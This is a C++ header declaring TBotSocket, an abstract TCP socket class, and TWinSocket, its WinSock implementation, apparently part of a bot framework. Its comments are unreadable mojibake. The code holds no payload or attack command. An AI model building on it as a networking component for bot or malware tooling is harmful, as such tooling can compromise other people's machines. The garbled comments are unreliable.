//---------------------------------------------------------------------------
//  ������ ����������� ������ � ��������
//
//  �����: 0.1
//  �������������: ��� 2012
//---------------------------------------------------------------------------

#ifndef BotSocketH
#define BotSocketH
//---------------------------------------------------------------------------


#include "windows.h"
#include "GetApi.h"



class TBotSocket;


//--------------------------------------------------------
//  CreateSocket - ������� ������ ����� ������ � ������-
//			       ����� �� ���������� �������� �������
//  �� ��������� ������������ Windows ������ � ��������
//  ����� TWinSocket
//--------------------------------------------------------
//TBotSocket* CreateSocket();





//***************************************************************
//  TBotSocket - ������� ����� ��� ������ � TCP �������
//***************************************************************
class TBotSocket : public TBotObject
{
protected:
	bool virtual DoConnect(const char *HostName, WORD Port, DWORD Timeout) { return false; }
	void virtual DoClose() {};
public:
    virtual ~TBotSocket();

	bool Connect(const char *HostName, WORD Port);
	bool Connect(const char *HostName, WORD Port, DWORD Timeout);
	void Close() { DoClose(); };
	int  virtual Write(const void* Buf, DWORD BufSize)  { return 0; }
    int  virtual Read(void* Buf, DWORD BufSize)         { return 0; }
};




//***************************************************************
//  TWinSocket - ����� ��� ������ � TCP �������
//				 ��������� WinSocket
//***************************************************************
class TWinSocket : public TBotSocket
{
protected:
	bool DoConnect(const char *HostName, WORD Port, DWORD Timeout);
	void DoClose();
public:
	TWinSocket();
	~TWinSocket() {};
	//void virtual Close();
	int Write(const void* Buf, DWORD BufSize);
    int Read(void* Buf, DWORD BufSize);
};


//---------------------------------------------------------------------------
#endif
